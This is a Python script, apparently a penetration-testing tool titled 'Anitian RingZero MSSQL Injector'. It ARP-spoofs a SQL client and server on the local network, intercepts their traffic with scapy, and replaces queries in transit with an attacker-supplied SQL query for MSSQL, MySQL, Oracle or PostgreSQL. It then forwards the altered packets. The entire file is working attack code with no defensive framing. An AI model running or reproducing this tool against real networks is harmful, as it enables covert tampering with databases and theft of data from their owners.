#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
#------------------------------------------------
import sys, getopt
from scapy.all import *
import unicodedata
import time, datetime
import argparse
import socket
import fcntl
import struct
import threading

#####################################
# ARP Scan - Get remote MAC address #
#####################################
def arp_scan(ip):
	conf.verb = 0
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")
	return 1

##############################################################
# Used to pad new query with spaces because of TCP checksum. #
##############################################################
def pad_query(old_query, new_query, q_modifier):
	padded_query = new_query
	length = len(old_query) - (len(new_query) * q_modifier)
	for i in range(0, length/q_modifier):
		padded_query = padded_query + " " # Add spaces to the end of the SQL query
	return padded_query
	
##############################################################
# Used to pad new query with spaces because of TCP checksum. #
# Also keeps special Oracle characters in place after query. #
##############################################################
def pad_query_oracle(old_query, new_query):
	padded_query = new_query
	length = len(old_query) - len(new_query) - 52
	#print "padding with " + str(length)
	#print old_query
	#print new_query
	for i in range(0, length):
		padded_query = padded_query + " " # Add spaces to the end of the SQL query
		
	# This all seems to be required for Oracle for some reason
	padded_query = padded_query + "\x01"
	for i in range(0, 27):
		padded_query = padded_query + "\x00"
	padded_query = padded_query + "\x01"
	for i in range(0, 8):
		padded_query = padded_query + "\x00"
	padded_query = padded_query + "\x80"
	for i in range(0, 14):
		padded_query = padded_query + "\x00"

	return padded_query
	
##############################################################
# Used to pad new query with spaces because of TCP checksum. #
# PostgreSQL keeps the semicolon at the end so we need this. #
##############################################################
def pad_query_postgresql(old_query, new_query):
	padded_query = new_query
	length = len(old_query) - len(new_query)
	for i in range(0, length - 2):
		padded_query = padded_query + " " # Add spaces to the end of the SQL query
	padded_query = padded_query + ";\x00"

	return padded_query

############################################
# Used to pad SQL strings with null bytes. #
############################################
def encode_query(query):
	query2 = ""
	for c in query:
		query2 = query2 + c + "\x00" # Insert bye \x00 after each character in the string
	return query2

###########################
# Get my own MAC address. #
###########################
def get_mac_address(my_interface):
	mac = get_if_hwaddr(my_interface)
	if mac != "00:00:00:00:00:00":
		return mac
	return 1

############################
# Get Interface IP Address #
############################
def get_interface_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

################
# ARP SPOOFING #
################
def arp_spoof(client_ip, server_ip):
	print "Sending ARP spoofing packets..."
	print "Client: " + client_ip + " / Server: " + server_ip

	# Tell the client that I am the server
	packet = ARP()
	packet.psrc = server_ip
	packet.pdst = client_ip
	packet.op = 2
	send(packet)

	# Tell the server that I am the client
	packet = ARP()
	packet.psrc = client_ip
	packet.pdst = server_ip
	packet.op = 2
	send(packet)
	return 0
	
##################
# Undo ARP Spoof #
##################
def undo_arp_spoof(client_ip, client_mac, server_ip, server_mac):
	rearp_packet = ARP()
	rearp_packet.psrc = client_ip
	rearp_packet.pdst = server_ip
	rearp_packet.hwsrc = client_mac
	rearp_packet.hwdst = server_mac
	rearp_packet.op = 2 # "is-at" opcode instead of the default "query"
	send(rearp_packet)
	
	rearp_packet = ARP()
	rearp_packet.psrc = server_ip
	rearp_packet.pdst = client_ip
	rearp_packet.hwsrc = server_mac
	rearp_packet.hwdst = client_mac
	rearp_packet.op = 2 # "is-at" opcode instead of the default "query"
	send(rearp_packet)
	return 0

###################################
# Search for matching MSSQL query #
###################################
def search_for_mssql(data, begin_keyword, end_keyword):
	i=data.lower().find(encode_query(begin_keyword))
	if i > 0:
		j=str(data).find(end_keyword, i)
		if j > 0:
			return data[i:j], i, j
	return 1,1,1

###################################
# Search for matching MYSQL query #
###################################	
def search_for_mysql(data, begin_keyword):
	i=data.lower().find(begin_keyword)
	if i > 0:
		return data[i:len(data)], i, len(data)
	return 1,1,1
	
################################
# Check for keyboard interrupt #
################################
def stopfilter(x):
	try:
		return True
	except keyboardInterrupt:
		print "Re-ARPing victims..."
		undo_arp_spoof(client_ip, client_mac, server_ip, server_mac)
		sys.exit(0)
		return False

#########################################
# Process each packet as it's received. #
#########################################
def processPacket(my_mac, server_type, client_mac, client_ip, server_mac, server_ip, begin_keyword, end_keyword, new_query):

### Must nest a function here to pass arguments from sniff() ###
	def manipulatePacket(in_packet):
	
		if in_packet.haslayer(TCP):
		
			out_packet=in_packet	#setup the outbound packet.
			srcmac=in_packet.src
			dstmac=in_packet.dst
			#print "srcmac: " + srcmac
			#print "dstmac: " + dstmac
	
		### Does the packet have Raw data? ###
			if in_packet.haslayer(Raw): 
				data=in_packet.load
				match = False
		
		### Does the Raw data contain keywords? ###
		### Check MSSQL ###
				if server_type == "mssql":
					old_query, startQuery, endQuery = search_for_mssql(data, begin_keyword, end_keyword)
					if old_query != 1:
						match = True
						
		### Check MYSQL ###
				elif server_type == "mysql" or server_type == "oracle" or server_type == "postgresql":
					old_query, startQuery, endQuery = search_for_mysql(data, begin_keyword)
					if old_query != 1:
						match = True
		
		### Do we have a match? ###
				if match == True:
					print "Found a matching packet!"
	
		### Is new Query too long? ###
					if server_type == "mssql":
						q_modifier = 2 # MSSQL has null bytes between characters so we must double our new query length
					elif server_type == "mysql" or server_type == "oracle" or server_type == "postgresql":
						q_modifier = 1
						
					if len(old_query) < (len(new_query) * q_modifier):
						print "Cannot replace: New query is longer than old query!"
						print "OldQuery: " + str(len(old_query)), " | NewQuery: " + str(len(new_query) * q_modifier)
					else:
	
		### Update outbound packet with new data ###
						if server_type == "mssql":
							out_packet.load=out_packet.load[:startQuery] + encode_query(pad_query(old_query,new_query,q_modifier)) + out_packet.load[endQuery:]
						elif server_type == "mysql":
							out_packet.load=out_packet.load[:startQuery] + pad_query(old_query,new_query,q_modifier) + out_packet.load[endQuery:]
						elif server_type == "oracle":
							out_packet.load=out_packet.load[:startQuery] + pad_query_oracle(old_query,new_query) + out_packet.load[endQuery:]
						elif server_type == "postgresql":
							out_packet.load=out_packet.load[:startQuery] + pad_query_postgresql(old_query,new_query) + out_packet.load[endQuery:]
						print "Replaced query!"
		
		### Check if packet is from victims.  ###
		### If so, replace MAC address fields ###
		### and send packet.                  ###
			if in_packet[IP].src == client_ip and srcmac == client_mac and dstmac == my_mac: # If source is client
				del out_packet[TCP].chksum
				out_packet.dst=server_mac # Send to server
				sendp(out_packet)
		
			if in_packet[IP].src == server_ip and srcmac == server_mac and dstmac == my_mac: # If source is server
				print "retransmitting packet to client"
				del out_packet[TCP].chksum
				out_packet.dst=client_mac # Send to client
				sendp(out_packet)
				
	return manipulatePacket
	
########
# MAIN #
########
def main(argv):

	print ""
	print "Anitian RingZero MSSQL Injector"
	print "By: Rick Osgood"
	print "Press Ctrl+C to quit."
	print ""

### Check arguments ###
	parser = argparse.ArgumentParser()
	parser.add_argument("interface", nargs=1, metavar="<Interface>", help="Interface to sniff on.")
	parser.add_argument("server_type", nargs=1, metavar="<SQL Server Type>", help="mssql/mysql/oracle/postgresql.")
	parser.add_argument("client_ip", nargs=1, metavar="<Client IP>", help="SQL Client IP.")
	parser.add_argument("server_ip", nargs=1, metavar="<Server IP>", help="SQL Server IP.")
	parser.add_argument("new_query", nargs=1, metavar="<New Query>", help="New query to inject.")
	parser.add_argument("--begin_keyword", nargs=1, metavar="<Begin Keyword>", help="Keyword (case-insensitive) at the beginning of the query to be replaced. Default: \"SELECT\"")
	parser.add_argument("--end_keyword", nargs=1, metavar="<End Keyword>", help="Keyword (case-insensitive) at the end of the query to be replaced. Default: \";\"")
	args = parser.parse_args()

### Remove the [" and "] from the strings
	my_interface = str(args.interface)[2:-2]
	server_type = str(args.server_type)[2:-2]
	client_ip = str(args.client_ip)[2:-2]
	server_ip = str(args.server_ip)[2:-2]
	new_query = str(args.new_query)[2:-2]
	if args.begin_keyword:
		begin_keyword = str(args.begin_keyword)[2:-2].lower() # Make lowercase for case insensitivity
	else:
		begin_keyword = "select" # Default value
	if args.end_keyword:
		end_keyword = str(args.end_keyword)[2:-2].lower()     # Make lowercase for case insensitivity
	else:
		end_keyword = ";" # Default value
	
### Get local MAC address ###
	my_mac = get_mac_address(my_interface)
	if not my_mac:
		print "Can't get local mac address. Quitting."
		sys.exit(1)
		
### Get local IP address ###
	my_ip = get_interface_address(my_interface)
	if not my_ip:
		print "Can't get local IP address. Quitting."
		sys.exit(1)
		
### Get client MAC address ###
	client_mac=arp_scan(client_ip)
	if client_mac is None or client_mac == 1:
		print "Could not get MSSQL client MAC address!"
		sys.exit(1)

### Get server MAC address ###
	server_mac=arp_scan(server_ip)
	if server_mac is None or server_mac == 1:
		print "Could not get MSSQL server MAC address!"
		sys.exit(1)
		
### Helpful output for debugging
	print "Sniffing on " + my_ip + "..."
	print ""

### Set the first Arp Spoof to happen after 1 second, from there it will happen every 15 seconds.
	arp_spoof(client_ip, server_ip)
	arpTimer=threading.Timer(15, arp_spoof, args=[client_ip, server_ip])
	arpTimer.start()
	
### Sniff packets forever ##
	filter_string = "host " + client_ip + " or host " + server_ip
	
	while True:
		sniff(filter=filter_string, prn=processPacket(my_mac, server_type, client_mac, client_ip, server_mac, server_ip, begin_keyword, end_keyword, new_query))

		arpTimer.cancel()
		print "Re-ARPing victims..."
		undo_arp_spoof(client_ip, client_mac, server_ip, server_mac)
		sys.exit(0)		
			
if __name__ == "__main__":
	main(sys.argv[1:])
